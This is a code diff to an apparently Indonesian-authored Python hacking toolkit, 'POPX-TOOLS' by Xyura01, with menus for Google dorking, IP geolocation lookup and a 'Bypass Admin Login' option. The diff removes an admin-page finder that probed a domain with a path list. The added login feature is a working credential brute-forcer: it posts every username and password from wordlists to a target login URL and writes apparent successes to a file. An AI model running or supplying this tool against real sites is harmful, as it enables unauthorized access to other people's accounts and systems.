@@ -12,7 +12,7 @@ y = '\033[0;33m'
 w = '\033[0;37m'
 r = '\033[0;91m'
 
-# Fungsi untuk membersihkan layar
+# Clear
 def clear_screen():
     os.system('clear')
 
@@ -20,20 +20,29 @@ def clear_screen():
 def print_banner():
     print(f"""{b}
 
- /$$$$$$$                      /$$             /$$   /$$
-| $$__  $$                    | $$            | $$  / $$ 
-| $$  \ $$  /$$$$$$   /$$$$$$ | $$   /$$      |  $$/ $$/  
-| $$  | $$ /$$__  $$ /$$__  $$| $$  /$$//$$$$$$\  $$$$/   
-| $$  | $$| $$  \ $$| $$  \__/| $$$$$$/|______/ >$$  $$  
-| $$  | $$| $$  | $$| $$      | $$_  $$        /$$/\  $$ 
-| $$$$$$$/|  $$$$$$/| $$      | $$ \  $$      | $$  \ $$ 
-|_______/  \______/ |__/      |__/  \__/      |__/  |__/  
-                                                         
-                                                         
-			Author: Xyura01
+
+  ____   ___  ______  __   _____ ___   ___  _     ____  
+ |  _ \ / _ \|  _ \ \/ /  |_   _/ _ \ / _ \| |   / ___| 
+ | |_) | | | | |_) \  /_____| || | | | | | | |   \___ \ 
+ |  __/| |_| |  __//  \_____| || |_| | |_| | |___ ___) |
+ |_|    \___/|_|  /_/\_\    |_| \___/ \___/|_____|____/ 
+                                                                                                   
+			        Author: Xyura01
 """)
 
-# Fungsi Dorking
+# Confirm
+def confirm_continue():
+    print(f"\n{b}Lanjut?{x}")
+    print("1) Kembali ke Menu")
+    print("0) Keluar")
+    pilihan = input(f" {b}Pilih:{x} {y}")
+    if pilihan == '1':
+        return
+    else:
+        print(f"{w}Exiting...{x}")
+        exit()
+
+# Fitur 1: Dorking
 def dorking():
     clear_screen()
     print_banner()
@@ -41,73 +50,121 @@ def dorking():
         dork = input(f" {b}{u}Dork Query{w}:{x} {y}")
         pages = int(input(f" {b}{u}Pages{w}:{x} {y}"))
         delay = int(input(f" {b}{u}Delay{w}:{x} {y}"))
-        print()
-
+        
+        results = []
         total = 0
         for result in search(dork, tld="com", lang="en", num=pages, start=0, stop=None, pause=delay):
-            with open('results.txt', 'a') as f:
-                f.write(f'{result}\n')
+            results.append(result)
             total += 1
-            print(f"{w}{total}) {g}{result}")
             if total >= pages:
                 break
+        
+        clear_screen()
+        print_banner()
+        print(f"{g}Hasil Dorking:\n{x}")
+        for i, res in enumerate(results):
+            print(f"{w}{i+1}) {g}{res}")
+            with open('results.txt', 'a') as f:
+                f.write(f"{res}\n")
 
         print(f"\n{w}Saved to: {g}results.txt")
+        confirm_continue()
 
     except ValueError:
         exit(f"{r}Input error! Please enter valid numbers.")
     except KeyboardInterrupt:
         exit(f"\n{r}Interrupted by user. Exiting...{x}")
 
-# Fungsi Admin Finder (tanpa delay)
-def admin_finder():
+# Fitur 2: IP Lookup
+def ip_lookup():
     clear_screen()
     print_banner()
     try:
-        domain = input(f" {b}{u}Domain{w}:{x} {y}")
+        ip = input(f" {b}{u}Enter IP Address{w}:{x} {y}")
+        response = requests.get(f"http://ip-api.com/json/{ip}")
+        data = response.json()
+
+        clear_screen()
+        print_banner()
+
+        if data["status"] == "success":
+            print(f"\n{g}IP Lookup Result:\n{x}")
+            print(f"{w}IP       : {g}{data['query']}")
+            print(f"{w}Country  : {g}{data['country']}")
+            print(f"{w}Region   : {g}{data['regionName']}")
+            print(f"{w}City     : {g}{data['city']}")
+            print(f"{w}ZIP Code : {g}{data['zip']}")
+            print(f"{w}ISP      : {g}{data['isp']}")
+            print(f"{w}Org      : {g}{data['org']}")
+            print(f"{w}Timezone : {g}{data['timezone']}")
+        else:
+            print(f"{r}Error: {data['message']}")
+        confirm_continue()
+    except KeyboardInterrupt:
+        exit(f"\n{r}Interrupted by user. Exiting...{x}")
+    except Exception as e:
+        print(f"{r}Failed to fetch IP info: {e}")
+        confirm_continue()
+
+# Fitur 3: Bypass Login
+def bypass_admin_login():
+    clear_screen()
+    print_banner()
+    try:
+        target_url = input(f" {b}{u}Masukkan URL Login{w}:{x} {y}")
         print()
 
-        # Membaca daftar halaman login admin dari list.txt
         try:
-            with open("list.txt", "r") as f:
-                admin_pages = f.readlines()
-                admin_pages = [page.strip() for page in admin_pages]
+            # Baca username dari file username.txt
+            with open("username.txt", "r") as f:
+                usernames = [line.strip() for line in f if line.strip()]
+            
+            # Baca password dari file password.txt
+            with open("password.txt", "r") as f:
+                passwords = [line.strip() for line in f if line.strip()]
         except FileNotFoundError:
-            exit(f"{r}File list.txt not found! Please create the file with admin pages list.")
+            print(f"{r}File username.txt atau password.txt tidak ditemukan!")
+            return confirm_continue()
 
-        total = 0
-        found_admin_pages = []
-        for page in admin_pages:
-            url = f"http://{domain}{page}"
-            try:
-                response = requests.get(url, timeout=5)  # default timeout tanpa input
-                if response.status_code == 200:
-                    print(f"{w}{total + 1}) {g}Found: {url}")
-                    found_admin_pages.append(url)
-                    total += 1
-            except requests.exceptions.RequestException:
-                continue
-
-        if total == 0:
-            print(f"{r}No admin login pages found for {domain}.")
+        success = []
+        clear_screen()
+        print_banner()
+        print(f"{g}Proses login...\n{x}")
+        
+        # Kombinasikan semua username dengan semua password
+        for user in usernames:
+            for passwd in passwords:
+                payload = {"username": user, "password": passwd}
+                try:
+                    res = requests.post(target_url, data=payload, timeout=5)
+                    if "dashboard" in res.text.lower() or res.status_code in [200, 302]:
+                        print(f"{g}[BERHASIL]{x} {user}:{passwd}")
+                        success.append(f"{user}:{passwd}")
+                        with open("bypass_success.txt", "a") as f:
+                            f.write(f"{user}:{passwd}\n")
+                    else:
+                        print(f"{r}[GAGAL]{x} {user}:{passwd}")
+                except:
+                    print(f"{r}[ERROR]{x} {user}:{passwd}")
+        
+        if not success:
+            print(f"\n{r}Tidak ada kombinasi yang berhasil.")
         else:
-            print(f"\n{w}Total Admin Pages Found: {g}{total}")
-            with open("found_admin.txt", "a") as f:
-                for admin_page in found_admin_pages:
-                    f.write(f"{admin_page}\n")
-            print(f"{w}Results saved to: {g}found_admin.txt")
+            print(f"\n{g}Berhasil login disimpan ke bypass_success.txt")
 
+        confirm_continue()
     except KeyboardInterrupt:
         exit(f"\n{r}Interrupted by user. Exiting...{x}")
 
-# Menu untuk memilih tools
+# Menu utama
 def main_menu():
     while True:
         clear_screen()
         print_banner()
         print(f"{b}{u}Select a Tool:{w}\n")
         print(f"1) Dorking Tool")
-        print(f"2) Admin Finder")
+        print(f"2) IP Lookup")
+        print(f"3) Bypass Admin Login")
         print(f"0) Exit")
         
         choice = input(f" {b}{u}Your Choice:{w}{x} {y}")
@@ -115,12 +172,14 @@ def main_menu():
         if choice == '1':
             dorking()
         elif choice == '2':
-            admin_finder()
+            ip_lookup()
+        elif choice == '3':
+            bypass_admin_login()
         elif choice == '0':
             print(f"{w}Exiting...{x}")
             exit()
         else:
             print(f"{r}Invalid choice! Please select a valid option.{x}")
 
-# Menjalankan menu utama
+# Jalankan
 main_menu()
